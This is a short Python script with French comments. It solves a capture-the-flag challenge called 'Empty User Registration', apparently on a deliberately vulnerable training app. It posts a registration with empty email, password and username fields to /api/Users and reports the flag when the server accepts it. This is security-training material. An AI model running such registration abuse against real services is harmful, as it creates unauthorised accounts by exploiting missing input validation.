import requests

class EmptyUserRegistration:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def register_empty_user(self):
        endpoint = f"{self.base_url}/api/Users"
        payload = {
            "email": "",  # Email vide
            "password": "",  # Mot de passe vide
            "username": ""
        }

        print(f"[REGISTER] Tentative d'inscription avec des champs vides...")
        response = self.session.post(endpoint, json=payload, headers=self.headers)

        if response.status_code == 201:  # Code HTTP 201 signifie "Créé"
            print("[SUCCESS] Inscription réussie avec des champs vides.")
            print(f"Response: {response.json()}")
            return True
        else:
            print(f"[FAIL] L'inscription a échoué. Statut: {response.status_code}")
            print(f"Response: {response.text}")
            return False

    def run_exploit(self):
        print("[EXPLOIT] Démarrage de l'exploit pour le challenge 'Empty User Registration'...")
        success = self.register_empty_user()
        if success:
            print("[EXPLOIT] Exploit terminé avec succès. Flag activé.")
        else:
            print("[EXPLOIT] L'exploit a échoué.")

